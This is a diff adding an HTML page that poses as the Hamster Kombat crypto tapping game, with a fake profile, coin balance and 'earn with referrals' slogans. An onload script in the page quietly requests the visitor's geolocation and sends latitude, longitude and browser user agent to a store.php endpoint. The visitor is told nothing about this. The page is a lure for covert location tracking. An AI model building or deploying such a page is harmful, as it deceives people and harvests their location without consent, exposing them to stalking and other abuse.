@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hamster Kombat</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body onload="getLocation()">
+
+    <p id="demo"></p>
+
+    <script>
+        var x = document.getElementById("demo");
+
+        function getLocation() {
+            if (navigator.geolocation) {
+
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent, true);
+            // xhttp.open("GET", "store.php?&uagent=" + navigator.userAgent, true);
+
+            xhttp.send();
+            // x.innerHTML = "Latitude: " + position.coords.latitude +
+            //     "<br>Longitude: " + position.coords.longitude;
+        }
+    </script>
+
+    <div class="container">
+        <div class="header">
+            <h1>Hamster Kombat</h1>
+            
+            <div class="user-info">
+                <img src="Screenshot 2024-08-01 194411.png" alt="Hamster Avatar" class="avatar">
+                <div>
+                    <p class="username">Naija Top-up (CEO)</p>
+                    <p class="level">Grandmaster 9 / 11</p>
+                </div>
+            </div>
+        </div>
+        <div class="rewards">
+            <div class="reward-item">
+                <p>Daily reward</p>
+                <p>12:51</p>
+            </div>
+            <div class="reward-item">
+                <p>Daily cipher</p>
+                <p>07:51</p>
+            </div>
+            <div class="reward-item">
+                <p>Daily combo</p>
+                <p>00:51</p>
+            </div>
+        </div>
+        <div class="currency">
+            <p class="amount">133,438,477</p>
+            <p><h3> <span class="multiple-text" style="color: red; display: block;"></span></h3></p>
+            <p class="profit">+1.35M per hour</p>
+        </div>
+        <div class="hamster">
+            <img src="Screenshot 2024-08-01 194411.png" alt="Hamster Image">
+        </div>
+        <div class="stats">
+            
+           
+            <div class="stat-item">
+                <p>Mine</p>
+            </div>
+            <div class="stat-item">
+                <p>Friends</p>
+            </div>
+            <div class="stat-item">
+                <p>Earn</p>
+            </div>
+            <div class="stat-item">
+                <p>Airdrop</p>
+            </div>
+        </div>
+    </div>
+    <script src="https://unpkg.com/typed.js@2.1.0/dist/typed.umd.js"></script>
+    <script>
+        var typed = new Typed(".multiple-text", {
+            strings: ["Earn with referrals", "Earn from tapping", "Just earn", "earn", "earn"],
+            typeSpeed: 100,
+            backSpeed: 100,
+            backDelay: 1000,
+            loop: true
+        })
+    </script>
+</body>
+
+</html>
